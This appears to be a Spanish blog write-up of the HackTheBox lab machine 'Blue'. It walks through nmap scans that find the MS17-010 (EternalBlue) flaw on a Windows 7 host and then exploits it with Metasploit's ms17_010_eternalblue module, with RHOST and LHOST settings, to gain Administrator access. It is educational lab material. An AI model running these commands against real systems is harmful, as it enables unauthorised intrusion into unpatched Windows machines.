---
layout      : post
title       : "Blue - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Blue-HackTheBox/Blue.webp
category    : [ htb ]
tags        : [ Windows ]
---

Tenemos una máquina nivel EASY Windows, en la que explotaremos la vulnerabilidad eternalblue del protocolo SMB, de forma automatizada con metasploit y no tendremos que escalar privilegios ya el propio exploit nos dará acceso al usuario Administrador.

![](/assets/images/HTB/Blue-HackTheBox/Blue2.webp)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

![](/assets/images/HTB/Blue-HackTheBox/Blue-rating.webp)

***


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Explotación](#explotacion).
    * [Metasploit](#metasploit).


***

# Reconocimiento [#](reconocimiento) {#reconocimiento}

***

## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}

Lanzamos el escaneo de puertos.

```nmap
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Lanzamos un escaneo mas detallado para saber que servicios y versiones se ejecutan en los puertos existentes que hay abiertos.

```nmap
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-10-16T20:10:20
|_  start_date: 2022-10-16T19:29:57
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-16T21:10:17+01:00
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
```

Lanzamos escaneo de vulnerabilidades usando un script que ya viene implementado en nmap, el script es `vuln`

```bash
# Comando para lanzar el script
-------------------------------
nmap -p145,139,445 -n -Pn --script=vuln 10.10.10.40
```

![](/assets/images/HTB/Blue-HackTheBox/nmap-vuln.webp)

Veremos que el sistema es vulnerable a smb-vuln-ms17-010 o eternalblue.

Asique procedo a explotar la vulnerabilidad.

![](/assets/images/HTB/Blue-HackTheBox/gif.gif)

# Explotación [#](explotación) {#explotacion}

***

## Metasploit [💣](#metasploit) {#metasploit}

Explotaré la vulnerabilidad a través de metasploit.

Buscando encuentro varios exploit, asique elijo el siguiente:

> `exploit/windows/smb/ms17_010_eternalblue`

![](/assets/images/HTB/Blue-HackTheBox/msf1.webp)

Configuro los parámetros del exploit:

```bash
# Ip de la máquina víctima
set RHOST 10.10.10.40
----------------------------
# Ip de mi máquina local (mi interfaz de la vpn)
set LHOST tun0
------------------------------------------------
# Lanzamos el exploit
exploit
---------------------
```

![](/assets/images/HTB/Blue-HackTheBox/msf2.webp)

Como podemos ver ya me he convertido en el usuario Administrador, por lo tanto ya podemos leer la flag user.txt y root.txt.

![](/assets/images/HTB/Blue-HackTheBox/flags.webp)

![](/assets/images/HTB/Blue-HackTheBox/fin.gif)

![](/assets/images/HTB/Blue-HackTheBox/share.webp)



